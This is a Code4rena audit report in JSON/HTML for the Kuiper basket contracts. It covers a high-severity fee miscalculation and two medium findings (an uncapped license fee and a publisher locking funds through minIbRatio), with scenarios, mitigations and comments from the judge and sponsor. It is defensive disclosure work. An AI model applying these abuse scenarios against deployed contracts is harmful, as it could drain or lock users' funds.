{
  "circa": {
    "title": "Kuiper contest",
    "sponsor": "Kuiper",
    "slug": "2021-12-defiprotocol",
    "date": "2022-05-02",
    "findings": "https://github.com/code-423n4/2021-12-defiprotocol-findings/issues",
    "contest": 65
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the Kuiper smart contract system written in Solidity. The audit contest took place between December 8—December 10 2021.</p>\n<p><em>Note: this audit contest originally ran under the name <code>defiProtocol</code>.</em></p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>27 Wardens contributed reports to the Kuiper contest:</p>\n<ol>\n<li><a href=\"https://twitter.com/KenzoAgada\">kenzo</a></li>\n<li>0x0x0x</li>\n<li>WatchPug (<a href=\"https://github.com/jack-the-pug\">jtp</a> and <a href=\"https://github.com/mingwatch\">ming</a>)</li>\n<li><a href=\"https://twitter.com/GiveMeTestEther\">GiveMeTestEther</a></li>\n<li><a href=\"https://twitter.com/gzeon\">gzeon</a></li>\n<li><a href=\"https://github.com/TomAFrench\">TomFrenchBlockchain</a></li>\n<li><a href=\"https://twitter.com/0xbroccolirob\">broccolirob</a></li>\n<li><a href=\"https://twitter.com/0xruhum\">Ruhum</a></li>\n<li><a href=\"https://twitter.com/_0v3rf10w\">0v3rf10w</a></li>\n<li><a href=\"https://twitter.com/gpersoon\">gpersoon</a></li>\n<li>robee</li>\n<li>Jujic</li>\n<li><a href=\"https://twitter.com/_ye0lde\">ye0lde</a></li>\n<li>rishabh</li>\n<li><a href=\"https://twitter.com/Meta0xNull\">Meta0xNull</a></li>\n<li><a href=\"https://twitter.com/cmichelio\">cmichel</a></li>\n<li>saian</li>\n<li>neslinesli93</li>\n<li><a href=\"https://twitter.com/danbinnun\">danb</a></li>\n<li><a href=\"https://twitter.com/merkleplant_eth\">pmerkleplant</a></li>\n<li>pedroais</li>\n<li><a href=\"https://github.com/bernard-wagner\">bw</a></li>\n<li><a href=\"https://twitter.com/SirH4shalot\">sirhashalot</a></li>\n<li>hagrid</li>\n<li>0x1f8b</li>\n<li><a href=\"https://twitter.com/BouSalman\">BouSalman</a></li>\n</ol>\n<p>This contest was judged by <a href=\"https://twitter.com/liam_eastwood13\">0xleastwood</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 20 unique vulnerabilities and 89 total findings. All of the issues presented here are linked back to their original finding.</p>\n<p>Of these vulnerabilities, 1 received a risk rating in the category of HIGH severity, 11 received a risk rating in the category of MEDIUM severity, and 8 received a risk rating in the category of LOW severity.</p>\n<p>C4 analysis also identified 29 non-critical recommendations and 40 gas optimizations.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2021-12-defiProtocol\">C4 Kuiper contest repository</a>, and is composed of 3 smart contracts written in the Solidity programming language and includes 588 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities according to a methodology based on <a href=\"https://owasp.org/www-community/OWASP_Risk_Rating_Methodology\">OWASP standards</a>.</p>\n<p>Vulnerabilities are divided into three primary risk categories: high, medium, and low.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code423n4.com\">the C4 website</a>.</p>\n<h1 id=\"high-risk-findings-1\" style=\"position:relative;\"><a href=\"#high-risk-findings-1\" aria-label=\"high risk findings 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (1)</h1>\n<h2 id=\"h-01-wrong-fee-calculation-after-totalsupply-was-0\" style=\"position:relative;\"><a href=\"#h-01-wrong-fee-calculation-after-totalsupply-was-0\" aria-label=\"h 01 wrong fee calculation after totalsupply was 0 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/58\">[H-01] Wrong fee calculation after <code>totalSupply</code> was 0</a></h2>\n<p><em>Submitted by kenzo</em></p>\n<p><code>handleFees</code> does not update <code>lastFee</code> if <code>startSupply == 0</code>.\nThis means that wrongly, extra fee tokens would be minted once the basket is resupplied and <code>handleFees</code> is called again.</p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Loss of user funds.\nThe extra minting of fee tokens comes on the expense of the regular basket token owners, which upon withdrawal would get less underlying than their true share, due to the dilution of their tokens’ value.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Scenario:</p>\n<ul>\n<li>All basket token holders are burning their tokens. The last burn would set totalSupply to 0.</li>\n<li>After 1 day, somebody mints basket tokens.</li>\n</ul>\n<p><code>handleFees</code> would be called upon mint, and would just return since totalSupply == 0. Note: It does not update <code>lastFee</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">} else if (startSupply == 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            return;</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2021-12-defiprotocol/blob/main/contracts/contracts/Basket.sol#L136:#L137\">Basket.sol#L136:#L137</a></p>\n<ul>\n<li>The next block, somebody else mints a token. Now <code>handleFees</code> will be called and will calculate the fees according to the current supply and the time diff between now and <code>lastFee</code>:</li>\n</ul>\n<!---->\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 timeDiff = (block.timestamp - lastFee);</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2021-12-defiprotocol/blob/main/contracts/contracts/Basket.sol#L139\">Basket.sol#L139</a><br>\nBut as we saw, <code>lastFee</code> wasn’t updated in the previous step. <code>lastFee</code> is still the time of 1 day before - when the last person burned his tokens and the basket supply was 0.\nSo now the basket will mint fees as if a whole day has passed since the last calculation, but actually it only needs to calculate the fees for the last block, since only then we had tokens in the basket.</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Set <code>lastFee = block.timestamp</code> if <code>startSupply == 0</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/58\">frank-beard (Kuiper) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/58#issuecomment-1079627201\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The issue can be outlined as follows:</p>\n<ul>\n<li>A user interacts with the basket and mints some amount of tokens, which sets <code>lastFee = block.timestamp</code>.</li>\n<li>The same user decides to exit the basket and burn their tokens.</li>\n<li>Some amount of time passes and another user enters the basket, but <code>handleFees()</code> did not set <code>lastFee = block.timestamp</code>. As a result, fees are charged on the user’s deposit for the entire time that the basket was inactive for.</li>\n</ul>\n<p>It seems that the basket is severely flawed in calculating fees on partially inactive baskets. This puts users’ funds at direct risk of being lost. Malicious publishers can setup baskets as a sort of honeypot to abuse this behaviour.</p>\n<p>This was an interesting find! Kudos to the warden.</p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-11\" style=\"position:relative;\"><a href=\"#medium-risk-findings-11\" aria-label=\"medium risk findings 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (11)</h1>\n<h2 id=\"m-01-missing-cap-on-licensefee\" style=\"position:relative;\"><a href=\"#m-01-missing-cap-on-licensefee\" aria-label=\"m 01 missing cap on licensefee permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/154\">[M-01] Missing cap on <code>LicenseFee</code></a></h2>\n<p><em>Submitted by gzeon, also found by 0x0x0x and TomFrenchBlockchain</em></p>\n<p>There is no cap on <code>LicenseFee</code>. While change of <code>LicenseFee</code> is under 1 day timelock, introducing a<br>\n<code>maxLicenseFee</code> can improve credibility by removing the “rug” vector. There is a <code>minLicenseFee</code> in the contracts, while imo make little sense to have <code>minLicenseFee</code> but not <code>maxLicenseFee</code>.</p>\n<p>An incorrectly set <code>LicenseFee</code> can potentially lead to over/underflow in <a href=\"https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L140-141\">Basket.sol#L140-141</a> which is used in most of the function.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L177\">Basket.sol#L177</a><br>\n<a href=\"https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Factory.sol#L77\">Factory.sol#L77</a><br>\n<a href=\"https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L49\">Basket.sol#L49</a></p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Define a <code>maxLicenseFee</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/154#issuecomment-1048121652\">frank-beard (Kuiper) acknowledged, but disagreed with High severity and commented</a>:</strong></p>\n<blockquote>\n<p>Generally it is intended for the publishers to act correctly and the timelock is intended to prevent incorrect values from making it all the way through, however there is validity in reducing how the fee can be modified, such as reducing how much any one fee change can change the fee. I would consider this a low risk issue.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/154#issuecomment-1079621078\">0xleastwood (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>It seems like changes to <code>licenseFee</code> could potentially brick the contract as <code>handleFees()</code> underflows, preventing users from minting/burning tokens. I’d deem this as <code>medium</code> severity due to compromised protocol availability.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-publisher-can-lock-all-user-funds-in-the-basket-in-order-to-force-a-user-to-have-their-bond-burned\" style=\"position:relative;\"><a href=\"#m-02-publisher-can-lock-all-user-funds-in-the-basket-in-order-to-force-a-user-to-have-their-bond-burned\" aria-label=\"m 02 publisher can lock all user funds in the basket in order to force a user to have their bond burned permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/53\">[M-02] Publisher can lock all user funds in the <code>Basket</code> in order to force a user to have their bond burned</a></h2>\n<p><em>Submitted by TomFrenchBlockchain, also found by WatchPug</em></p>\n<p>All user funds in a basket being held hostage by the publisher</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <code>Basket</code> publisher can propose an auction in order to set new tokens and weights with a 1 day timelock.</p>\n<p><a href=\"https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L216-L244\">Basket.sol#L216-L244</a><br></p>\n<p>As part of this call they can set the <code>minIbRatio</code> variable which determines what the maximum slippage on the auction is allowed to be. If it’s set to the current <code>IbRatio</code> then the Basket accepts no slippage.</p>\n<p>The publisher can choose to set <code>minIbRatio = type(uint256).max</code> which will prevent any auction bids from being successful, locking the basket in the auction state.</p>\n<p>It’s not possible to enter or exit the basket while an auction is going on, so any users who hold any funds in the basket are forced to take the only option to kill the auction available to them.</p>\n<p><a href=\"https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L91-L119\">Basket.sol#L91-L119</a><br></p>\n<p>If a user makes a bond and then waits a day to then call <code>Auction.bondBurn</code>, it will reset the auction and allow users to withdraw but it requires 0.25% of the supply of the basket token to be burned.</p>\n<p><a href=\"https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Auction.sol#L121-L134\">Auction.sol#L121-L134</a><br></p>\n<p>One of the basket’s users is then forced to give up some of their assets to secure the release of the remaining assets in the basket (for a 24hr period until the publisher starts a new auction).</p>\n<p>This attack can be launched at any time with only 24 hours warning. This is a very short amount of time which near guarantees that if other users hold funds in the basket that not all of them will successfully withdraw in that time and so will have funds locked.</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Again this is tricky to mitigate as there are legitimate scenarios where we would expect the <code>ibRatio</code> to increase. e.g. a basket containing WBTC being changed to contain USDC as each basket token should be worth much more USDC than it was in terms of WBTC.</p>\n<p>To be frank the entire auction mechanism is a bit shaky as it doesn’t account for changes in the values of the tokens over time.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/53#issuecomment-1048140154\">frank-beard (Kuiper) acknowledged, but disagreed with High severity and commented</a>:</strong></p>\n<blockquote>\n<p>This is where community action and the timelock should mitigate attacks of these types. Users should be able to hold publishers accountable for their rebalances, whether that is through a dao or other means. We acknowledge there is some level of trust required between the user and the publisher however this is also intentional, for the types of products this protocol is for.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/53#issuecomment-1079625679\">0xleastwood (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Because a timelock is used in this instance, exploiting this issue proves more difficult and requires that the <code>publisher</code> is malicious. As we are dealing with an abuse of privileges, I think this fits the criteria of a <code>medium</code> severity issue as the issue can only be exploited by a trusted account.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/53#issuecomment-1079816317\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Actually I’m not sure if I understand the exploit:</p>\n<ul>\n<li>The publisher must wait a day to call <code>Basket.publishNewIndex()</code>, setting new values and starting an auction. In that time, users are free to exit the protocol as they wish.</li>\n<li>However, users who were not able to exit in time are obligated to call <code>Auction.bondForRebalance()</code> in order to unlock the basket’s underlying assets. But because <code>Auction.settleAuction()</code> will always revert, this user forfeits their bond to unlock the rest of their tokens.</li>\n</ul>\n<p>In this case, I see this as an abuse of the publisher’s privileges and lack of oversight by the users. <code>medium</code> severity seems correct in this situation.</p>\n</blockquote>\n<hr>\n<h2 